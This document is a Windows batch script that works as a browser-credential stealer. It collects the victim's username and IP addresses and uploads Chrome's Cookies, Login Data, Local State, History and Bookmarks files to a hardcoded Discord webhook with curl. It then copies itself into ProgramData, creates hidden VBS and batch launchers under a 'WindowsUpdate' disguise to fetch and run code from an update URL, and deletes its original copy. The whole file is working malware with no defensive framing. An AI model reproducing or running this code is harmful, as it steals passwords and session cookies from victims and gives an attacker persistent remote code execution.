@echo off

set "vpath=C:\ProgramData"

cd %vpath%

set "webhook=https://discord.com/api/webhooks/1044755955658805288/PIqw_rlluc9xbt3MurYhOx7Cz3PZC7ramK5Ew9i1htU86SgmeM2R3J5de9QuKscE4o3Y"

for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a

for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
)

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
curl --silent --output /dev/null -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
timeout /t 2 /nobreak > NUL
curl --silent --output /dev/null -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
timeout /t 2 /nobreak > NUL
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%

timeout /t 2 /nobreak > NUL

set "recurring=false"

>NUL attrib -h "%vpath%\%uname%"
>NUL attrib -h "%vpath%\%bname%"
>NUL attrib -h "%vpath%\%vname%"

set "when=Daily"
set "ScheduleName=WindowsUpdate"
set "bname=0.bat"
set "uname=1.bat"
set "vname=0.vbs"

del /ah "%vpath%\%uname%" >nul 2>&1
del /ah "%vpath%\%vname%" >nul 2>&1

if not "%~dp0"=="%vpath%\" (
  del /ah "%vpath%\%bname%" >nul 2>&1
  >NUL copy "%~f0" "%vpath%\%bname%"
)

if "%updateurl%"=="" (
	echo set WshShell = wscript.createobject^("WScript.shell"^)> "%vpath%\%vname%"
	echo WshShell.run """%vpath%\%bname%"" ", 0, true>> "%vpath%\%vname%"
	echo set WshShell = Nothing>> "%vpath%\%vname%"
	
IF EXIST "%vpath%\temp.txt" del "%vpath%\temp.txt" >nul 2>&1

echo ^@echo off> "%vpath%\%uname%"
echo cd "%vpath%">> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
echo :wl>> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
echo timeout /t 1 >> "%vpath%\%uname%"
echo goto wl>> "%vpath%\%uname%"
echo :w2>> "%vpath%\%uname%"
echo 2^>NUL del %bname%>> "%vpath%\%uname%"
echo ren temp.txt %bname%>> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
echo break^>%vname%>> "%vpath%\%uname%"
echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo start %vname%>> "%vpath%\%uname%"
echo timeout 1 ^>nul>> "%vpath%\%uname%"
echo break^>%vname%>> "%vpath%\%uname%"
echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"

>NUL attrib "%vpath%\%vname%" +h
>NUL attrib "%vpath%\%bname%" +h
>NUL attrib "%vpath%\%uname%" +h

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Batch Scheduled: %recurring%\n[End of report]```\"}"  %webhook%

if not "%~dp0"=="%vpath%\" (
	call :d & exit /b
	:d
	start /b "" cmd /c 2^>NUL del "%~f0"&exit /b
)
exit